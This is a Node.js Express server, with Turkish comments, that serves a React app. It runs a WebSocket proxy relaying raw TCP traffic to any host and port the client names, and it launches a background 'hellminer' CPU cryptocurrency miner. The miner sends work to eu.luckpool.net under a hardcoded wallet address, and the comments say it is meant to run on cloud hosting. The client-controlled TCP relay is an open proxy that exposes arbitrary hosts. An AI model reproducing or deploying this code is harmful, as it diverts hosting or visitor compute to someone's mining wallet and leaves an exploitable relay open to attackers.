const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const net = require('net');
const path = require('path');
const cors = require('cors');
const { spawn } = require('child_process');

const app = express();
app.use(cors());

// Arayüzü (React/Vite) Sunuyoruz
app.use(express.static(path.join(__dirname, '../public')));

// Render Sağlık Kontrolü
app.get('/health', (req, res) => {
  res.status(200).send('Proxy ve Hellminer Aktif!');
});

// React Router Desteği
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

console.log('--- STRATUM WEBSOCKET PROXY BAŞLATILIYOR ---');

wss.on('connection', (ws, req) => {
  let tcpClient = null;
  let isConnected = false;

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      if (data.type === 'connect' && !isConnected) {
        tcpClient = new net.Socket();
        tcpClient.connect(data.port, data.host, () => {
          isConnected = true;
          ws.send(JSON.stringify({ type: 'connected', msg: 'Havuz bağlantısı sağlandı.' }));
        });

        tcpClient.on('data', (poolData) => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'pool_data', payload: poolData.toString() }));
          }
        });

        tcpClient.on('end', () => {
          if (ws.readyState === WebSocket.OPEN) ws.close();
        });

        tcpClient.on('error', (err) => {
          if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'error', msg: err.message }));
        });
      } else if (data.type === 'mining_data' && isConnected && tcpClient) {
        tcpClient.write(data.payload + '\n');
      }
    } catch (e) {}
  });

  ws.on('close', () => {
    if (tcpClient) tcpClient.destroy();
  });
});

// --- ARKA PLAN GERÇEK CPU MADENCİSİ (HELLMINER) ---
console.log('--- ARKA PLAN KAZIM İŞLEMİ BAŞLATILIYOR ---');
const minerArgs = [
    '-c', 'stratum+tcp://eu.luckpool.net:3956',
    '-u', 'RTDTYfTX9a8DdAfr9won6DspWxxobgxE21.AutoServer',
    '-p', 'x',
    '--cpu', '2'
];

try {
  // Arka Planda hellminer'ı çalıştır
  const minerProcess = spawn('./hellminer', minerArgs, { cwd: '/app' });
  minerProcess.stdout.on('data', (data) => console.log('[MINER]:', data.toString().trim()));
  minerProcess.stderr.on('data', (data) => console.error('[MINER ERR]:', data.toString().trim()));
  minerProcess.on('close', (code) => console.log('Miner kapandı, kod:', code));
} catch (e) {
  console.log('Arka plan madencisi çalışma dizininde (lokalde) bulunamadı. Sadece Docker / Render ortamında aktiftir.');
}

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Sunucu şu portta tamamen hazır: ${PORT}`);
});
